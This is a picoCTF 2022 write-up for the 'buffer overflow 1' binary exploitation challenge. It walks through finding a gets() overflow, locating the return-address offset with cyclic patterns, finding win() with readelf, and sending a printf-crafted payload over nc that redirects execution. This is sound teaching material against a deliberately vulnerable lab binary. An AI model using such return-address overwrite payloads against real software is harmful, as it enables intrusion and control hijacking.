# buffer overflow 1
## Description
- **Tags**:
    - picoCTF 2022
    - Binary Exploitation

- **Author**:
    - Sanjay C
    - Palash Oswal

Control the return address

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln).
You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using

```
nc saturn.picoctf.net 53929
```

## Exploration

Taking a look a the source code, we see that we have a classic and `win()` that outputs the flag and `vuln()` that uses `gets()` which is suceptible to a buffer overflow. Interestingly `vuln()` also gives us a helpful clue for where to insert EIP for our payload, though unfortunately that's not included in our download so we'd need to remove that for a local version:

```c
...
#include "asm.h"
...
printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
```

With this output, however, we can use a cylcic pattern to identify EIP:
```
$ cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

$ nc saturn.picoctf.net 53929 <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

$ cyclic -l 0x6161616c
44
```

To find EIP:
```
$ readelf -s vuln | grep win
    63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
```

Craft and run a payload:
```bash
$ cyclic 44 # Really could generate any string of 44 characters
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa

# Make sure to have newline \x0A at the end to end input
$ printf 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa\xf6\x91\x04\x08\x0A' > payload

$ nc saturn.picoctf.net 53929 < payload
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{REDACTED}
```

### Bonus Points
Made a script that works both local and remote

```
$ ./exploit_vuln.py saturn.picoctf.net 53929
picoCTF{REDACTED}
```